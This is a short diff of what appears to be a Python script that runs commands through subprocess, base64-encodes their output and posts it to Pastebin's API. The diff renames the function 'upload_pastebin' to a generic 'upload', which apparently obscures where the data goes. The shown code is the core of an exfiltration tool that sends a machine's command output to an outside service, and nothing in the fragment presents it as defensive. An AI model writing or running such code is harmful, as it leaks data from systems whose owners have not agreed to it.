@@ -1,6 +1,6 @@
 import subprocess, requests, base64, os
 
-def upload_pastebin(data):
+def upload(data):
     
     url = 'https://pastebin.com/api/api_post.php'
     api_data = {
@@ -27,7 +27,7 @@ def run_cmd(cmd):
             results.append(output.decode())
 
     results = "\n".join(results)
-    upload_pastebin(base64.b64encode(results.encode()))
+    upload(base64.b64encode(results.encode()))
 
 
 def main():
